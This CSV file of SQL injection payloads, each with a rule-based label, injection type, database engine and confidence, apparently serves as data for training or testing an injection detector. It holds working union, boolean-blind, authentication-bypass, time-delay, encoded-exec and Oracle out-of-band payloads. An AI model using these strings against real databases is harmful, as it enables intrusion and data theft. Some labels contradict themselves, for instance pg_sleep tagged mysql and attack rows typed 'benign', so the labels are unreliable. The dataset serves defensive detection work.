row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
630,"select * from users where id = 1 + @<1# union select 1,version ( ) -- 1",1,,union_based,generic,0.95,"union select, @<1# union select detected — union_based injection (priority 7) on generic",rule-based
631,admin' ) or ( '1' = '1'#,1,,boolean_blind,generic,0.95,) or ( detected — boolean_blind injection (priority 8) on generic,rule-based
632,select * from users where id = '1' or !<@ or 1 = 1 -- 1',1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
633,; or '1' = '1',1,,boolean_blind,generic,0.85,or '1' = '1' detected — boolean_blind injection (priority 8) on generic,rule-based
634,declare @q nvarchar ( 200 ) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec ( @q ),1,,rce,generic,0.95,0x730065006c00650063007400200040004000760065007200730069006f006e00 detected — rce injection (priority 1) on generic,rule-based
635,"admin"" #",1,,auth_bypass,generic,0.95,"admin"" #, admin"" # with admin prefix — auth bypass pattern (priority 9)",rule-based
636,select * from users where id = 1 % ( 1 ) or 1 = 1 -- 1,1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
637,"select * from users where id = '1' or \< = 1 union select 1,@@VERSION -- 1'",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
638,"select * from users where id = 1 or @#"" ( = 1 or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
639,; begin declare @var varchar ( 8000 ) set @var = ' ...,1,,rce,generic,0.95,declare @var varchar detected — rce injection (priority 1) on generic,rule-based
640,select * from users where id = 1 + \+%$ or 1 = 1 -- 1,1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
641,) or pg_sleep ( __TIME__ ) --,1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
642,PRINT @@variable,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
643,"select * from users where id = 1 or @#"". = 1 or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
644,or a = a--,1,,boolean_blind,generic,0.85,or a = a detected — boolean_blind injection (priority 8) on generic,rule-based
645,or 'x' = 'x,1,,boolean_blind,generic,0.85,or 'x' = 'x detected — boolean_blind injection (priority 8) on generic,rule-based
646,"select * from users where id = 1 or ""1{"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
647,a' or 1 = 1; --,1,,boolean_blind,generic,0.85,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
648,"select * from users where id = '1' or $<\ union select 1,@@VERSION -- 1'",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
649,select * from users where id = 1 % ( \ ) or 1 = 1 -- 1,1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
650,""" or """"-""",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
651,*(|(mail=*)),1,,unknown,unknown,0.5,Insufficient information to classify,rule-based
652,"select * from users where id = 1 or "" ( _"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
653,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( USERNAME ) FROM ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS ) WHERE LIMIT = 3 ) ) AND 'i' = 'i",1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
654,"select * from users where id = 1 or \.<$ union select 1,@@VERSION -- 1",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
655,"admin"" ) or ""1"" = ""1""#",1,,boolean_blind,generic,0.95,"or ""1"" = ""1"" detected — boolean_blind injection (priority 8) on generic",rule-based
656,"select * from users where id = 1 or 1#""1 union select null,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
657,"select * from users where id = '1' union select 1,banner from v$version where rownum = 1 -- 1'",1,,union_based,oracle,0.95,union select detected — union_based injection (priority 7) on oracle,rule-based
658,""" ) or ( ""x"" ) = ( ""x",1,,boolean_blind,generic,0.95,) or ( detected — boolean_blind injection (priority 8) on generic,rule-based
659,23 OR 1 = 1,1,,boolean_blind,generic,0.85,OR 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
